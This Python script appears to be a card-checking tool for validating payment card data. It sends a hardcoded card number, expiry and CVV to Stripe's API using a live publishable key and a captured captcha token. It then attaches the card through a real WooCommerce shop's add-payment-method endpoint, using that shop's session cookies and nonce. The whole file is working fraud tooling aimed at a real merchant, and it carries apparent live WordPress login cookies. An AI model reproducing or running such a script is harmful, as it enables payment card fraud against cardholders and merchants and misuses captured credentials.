import requests


#CC CONTAINER
cc = '5168404484849428'
mm = '04'
yy = '30'
cvv = '160'


#PM ID REQUEST
headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
}

data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&payment_user_agent=stripe.js%2F234f261dc5%3B+stripe-js-v3%2F234f261dc5%3B+payment-element%3B+deferred-intent%3B+autopm&referrer=https%3A%2F%2Fe-led.lv&time_on_page=34017&client_attribution_metadata[client_session_id]=838ef9b5-da98-4c0e-8a5d-d3e98b776266&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=automatic&client_attribution_metadata[elements_session_config_id]=5a9e28d1-d871-448e-924f-a5de97fb10ec&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=eb95b48f-91cf-4be1-b62f-60db377277f55d3cc0&muid=4283367d-e4a5-4533-9066-efa9d4b251d1b74c5c&sid=979dfd84-066d-4f36-9f81-3b981d3c50a9970f32&key=pk_live_51Kg8dtBXnyl1N5QY5UDJKCtBpYRB0SiGjpzJdN2sdcy3BxgAQRFtRxQEbm3lBmHQBzUWb3gz9bcVrkcMAVJ2xwav00P1HQeJHz&_stripe_version=2024-06-20&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzYxODM2NTAyLCJjZGF0YSI6IlB4QnRDRHp4VU15Tm1oSEhPK3lxYjVZdmJKeGZnMXp1SjNkYm4xVElnZlBuV0FWM1huc2tCb1k2MnoxV2tLTXhHS3EzbkZDTTI4MkRKNlNVajByYmNDRkM1MGg5M3pibU9yZkgwME50UGl6U2cxb2VDNW9FY09HdUV1SDl5ay93YjdYRUh0a1NPdUdkS0lpTGlhNWl2ZHEzV0JJMnhySTZHQjk0SE1LT0E4ZXhhSzJFWWxveXY3ejE4NWt6aHNNUllJcnNnS0ZhS21JUGFORlUiLCJwYXNza2V5IjoicTUrdUQ2TzU1YzExNFNnVFU0VTJqV044blNrbzFPMGN2Q1dZTTRodm92VGJXdmdUTWpnaE9MSGVnRG1NZnVxWnJnWnlOc2pZYW51dHllckgzN3lHbUJPYnBWNG5wbmU1Uk82NEVsOGNLQkhvcUg1RHpiZVFzSTladFROODIzRndHd05DM1VsZDBlZTFwcm5mWjBwc0JtTkhUS2xILzJ4YXd0WnRXRTRic0xmUFdvTlQvZFNuREh2QmZibVRQcVQraHBYVzBkTnhtV0ZaSVp1b1RWTXNRVTJEYkhEQ0JETmdMOTQ2azlLREhYeFoyTXQyazkwbnZZdlc3eDloSEVvUmhPS2R6SFlnWk13Nk90ekNTUWpGUERxakkwQjd2NGE3eFp3SEJNRjhHdi9DdU5oRFRmR0JaMUlTY2NhNzcwaE1iUGZvcldrVG12UFlVTDMwdnNsak13YTBldldhTVppMnpHUUduWEJRTFVHK3I5L1pSdEdZcmU0aEsxTytiRzVUY0wzVWxKaVUrMXpFQjV6WHpCVjc3R21jOFJHQmNaQmVxc09VV0FudU1JSEpBYk1hTzRSY2lvbWowUWUzTHZ1RkMxMFBsVmRhS0NiU3Zmc1NpbmlNZEEvRlVmWHk5ZlFib3F2K1NFcVBYWkZ0VzY2ZHpiZ0poUU9uQ01SZFdOUDUwT2lKTWJhR2IwUGxmMlltUDQ2UElOMG51S0NOWkd5c2lBMHp2MFFBMUNNdVRLUnJJRGxjdm5QeGwxd3NUc2tNTzhpUjROUmc2VUlSajdzV0VjRXkwaWtPdUgzRWxmeHU5RWpoMlNraFR2djUzTnU2ZE1MTTVDNDVFSHdtOFphMEFYcml2UHFnTDZCeGpIOGprTGtmRmN3ckhiNFJzMy80YnBYK1ZpY3R3R1dhNVdvc253WEtWSEZwK0E3NGhEWDNmTmkvWHE2NGJNVkNMUXRGcnBFOGRIT3ltOTk4UjlmNzFjMDdxWDBOVzFtNlczZ0pISXQ1dGtQTllkK0VrTlpHMklIMDVtY2JRVzZJbjlZV2N2YkU1R3QrYnhSZk95OUxxaW9PWVVwdFhDbHh3MGJYbWJuTkNqR2NlOUJtRWFPL2FTZDJnNVVHc3l4OFozNGhuUmE0SWRWNmRzQmtpQ2pEbkt3MWlQS0s3SDltdmFFL2JMRk5lZ3BCWFlnQVl5cjNsZmIxb1VqeXFhODVmZStRYWh3VTZINXhrbWZkUk51YktZYVNYWnN2RlMrK0NhVjVmbkdOc2gyNFB1UklUY3JFWjVzeE9Bc3NjOWFSV3ZTYjhhbUM5dVhLZnJUZ21zb0lkNGZDQldTMEFqUmVOSjZBRWEybWZaQ1UzcEJ2Q0JaQUF2YlNoWkE3cWZEYWxMNUVjVFFkTExTZDA2N3F2MGVLYXJOMEpOdjhlaWE2Nm1vYVhiRDFFWWk5NTNialFtWXNPMlpSenF4VmZqMDVtT0FnS3RnVkZLMGU1STk5alA1ejFCMk9wOWJGZHdZT3Vjd0Zmc0lmVytMT2F2UmhwbmFsUm81QWdVcTRQN3RNMFM0TVhzQk1wd3F6ano2MDNXeithY3h3VTBUOTJwTFRxcVFDbVJobHJudnlYYVZDYXNKT2h2Y3JCeHFGNVV6YVYzeDBNcyt2YjdUdTdhc3EzZ0pqZlVwZy9uNEJHM2xJQ3Q4K0J5a0tNd0Y3R2xkQVBRZDk2Z2tvNFpSTzZmOEhuK3ljOEVZZ3dlTWdVUW9DY3RrRTVSZ0xxVlNudTVDdmNIY3hPZkFGTDkvQXFSMHNBQ01tVFRhMEJacG9mMXdVb2NVSGZTVyswZlZhUGw5UE0vc0xvYXRzUXY1NmIxek1JM2ozZUl0S3ZTWm9UYzBJT3AxOVdPUzVKckdCZ3hKM3dwNlFDTVpTeUo5TlptWVV4TENNb3VZUW5yWkVlS0l4bXpqaTdIODhFMTQxbW9sanBKcUk2cjdPb3lHOGpVUEpicEdNYjVKclNVSkFycmU5UUM3QWIrRkduQ2xqYlNFWS9CZlNVdXlEazNyVU1VMU5JMWh1aWw3UTJmS1RaZHJGdHIxcVlQTG52OWdKSTgxdFNIMGVweGhqTUdYc3dsck9LTnFsbEtkOXRRNC9TWGhUcmU2bm5pclMzdVJwQ0RrQVd5U0tQL3Z4QXlCeFRyZnBtbncvdFFrSUdkWm4xbjBXMGRTQnhZSzBtc1BaaWp3VjVDQlhDOGxwVllvNGhadHlVYm40aTB3elVCS3lQNWVFVGI0NFI3bWtIWGI4czFiZ2hWc3lLdXhxUk00RnpVelFNSXlxcWlWeWNLcmREOGhYUTNQTzJDUDcyc2d4dTdXNURRZEFIMkZoRXBTNGlCRWZTcEhRWFJ2MHJIczAxV24rcmJ5Vit5VWpON0xNQ2xQVEhxRURQVGJZNk5DQjljS3lTT0dsd01lU2o0R0taNTE0bWNxZkE2WURKSWJ6UUJHM1lIOVhyY1NySENGRlFzZkNQMzU5bjQrblNxdmFxV2JWRitDQ3FTWVVwK1FlRk5TM3dUR2NINjljeE5ZOVhLVm5KUWltMzgyRTA2bVVGMms2SWxSNWl2SmYxc0t2WjBibWdVYWp1ZHFwcUIwN20xKzRwbERLcFVINkhYMXNuK09McEJHUzF6aDNzWWlwTzJ0bXBPVVR4NUY5T3hCWVRmRFYvdEhaMkRvN1ZoOWw1TXFwNm1kUEs4YnlHUFpwdVZsQ0xDRU03SnhGbFRZV1F1Y2xRMnFDSkxVSjRidmYzMmtKIiwia3IiOiJmNTZiMWI3Iiwic2hhcmRfaWQiOjI1OTE4OTM1OX0.4D2WwdiKpz9VLunOcb1j4c1uQ7HDTQy5HrqBmDmixDc'

response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

op = response.json()
id = op["id"]


#PAYMENT PROCESS REQUEST

cookies = {
    'wordpress_sec_417153a0f5c2f87ed25ef38d98bb3798': 'wizardlyaura999%7C1763044252%7Cgmo4M0sfI8IxlFzLgfKsUXa6n98XKO534e5iTmhLChy%7C9b4bff24b3b91e7948e2a811a207921d33ede110b00df75899bbf3266d4da291',
    '_ga': 'GA1.1.1099647460.1761834639',
    '__stripe_mid': '4283367d-e4a5-4533-9066-efa9d4b251d1b74c5c',
    '__stripe_sid': '979dfd84-066d-4f36-9f81-3b981d3c50a9970f32',
    'wordpress_logged_in_417153a0f5c2f87ed25ef38d98bb3798': 'wizardlyaura999%7C1763044252%7Cgmo4M0sfI8IxlFzLgfKsUXa6n98XKO534e5iTmhLChy%7C8982c166613712bbe0d5b5c0ba035e4cca2ac6c5a1308dbae2a6b01458273ccd',
    'woodmart_cookies_1': 'accepted',
    'wp-wpml_current_language': 'en',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-10-30%2014%3A26%3A03%7C%7C%7Cep%3Dhttps%3A%2F%2Fe-led.lv%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2025-10-30%2014%3A26%3A03%7C%7C%7Cep%3Dhttps%3A%2F%2Fe-led.lv%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
    'sbjs_session': 'pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fe-led.lv%2Fmy-account%2Fadd-payment-method%2F',
    '_ga_1VF3WFHL9K': 'GS2.1.s1761834638$o1$g1$t1761836361$j60$l0$h0',
}

headers = {
    'authority': 'e-led.lv',
    'accept': '*/*',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://e-led.lv',
    'referer': 'https://e-led.lv/my-account/add-payment-method/',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

data = {
    'action': 'wc_stripe_create_and_confirm_setup_intent',
    'wc-stripe-payment-method': id,
    'wc-stripe-payment-type': 'card',
    '_ajax_nonce': '10c0cddbbc',
}

response = requests.post('https://e-led.lv/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)


print(response.text)